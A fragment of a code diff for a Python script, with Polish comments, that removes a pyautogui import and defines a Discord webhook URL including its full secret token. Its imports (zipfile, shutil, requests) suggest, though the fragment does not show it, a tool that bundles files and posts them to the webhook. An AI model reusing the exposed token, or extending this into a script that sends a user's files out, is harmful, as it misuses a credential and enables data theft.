@@ -2,7 +2,7 @@ import os
 import shutil
 import zipfile
 import requests
-import pyautogui
+
 
 # URL webhooków (możesz dostosować je w zależności od użytkownika)
 webhook_url_1 = "https://discord.com/api/webhooks/1322292531374854224/Fdl-C9RgDUxDtK2bFQXPpRx5G_jGHjy2cNJ-k7_4O4kUAIfJaIZLOTz2JUSLon5QBOGe"
